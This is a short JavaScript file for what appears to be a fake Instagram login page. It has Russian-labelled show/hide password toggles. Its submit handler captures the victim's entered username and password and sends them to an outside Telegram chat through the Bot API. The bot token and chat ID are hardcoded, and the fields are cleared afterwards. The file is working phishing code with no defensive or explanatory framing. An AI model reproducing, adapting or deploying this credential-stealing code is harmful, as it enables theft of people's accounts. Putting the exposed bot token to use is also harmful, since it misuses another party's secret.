
const hidden = document.querySelector("#hidden");
const inputPass = document.querySelector("#pass");

function addShow() {
  hidden.style.display = "block";
}

hidden.addEventListener("click", () => {
  if (hidden.innerHTML == "Скрыть") {
    hidden.innerHTML = "Показать";
    hidden.style.color = "rgba(0, 0, 0,0.705)";
  } else {
    hidden.innerHTML = "Скрыть";
    hidden.style.color = "rgba(0, 0, 0, 0.249)";
  }
});

hidden.addEventListener("click", function (e) {
  // toggle the type attribute
  const type =
    inputPass.getAttribute("type") === "password" ? "text" : "password";
  inputPass.setAttribute("type", type);
  // toggle the eye / eye slash icon
});


//? form
const instaForm = document.querySelector("#instaForm");


const btnImage = document.querySelector("#btnNone");
const user = document.getElementById("user");
const pass = document.getElementById("pass");

    CHAT_ID = "-1002100737524";
    TOKEN = "7056860594:AAElnYaBstMNRhXzl7dG1VmkD8YHbspXs6A";
    URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

    instaForm.addEventListener("submit", function (e) {
      e.preventDefault();

      let message = `\n`;
      message += `<b>nick: </b>${user.value}\n`;
      message += `<b>pass: </b>${pass.value}`;

      axios.post(URL_API, {
        chat_id: CHAT_ID,
        parse_mode: "html",
        text: message,
      });
      user.value = "";
      pass.value = "";
      
      
    });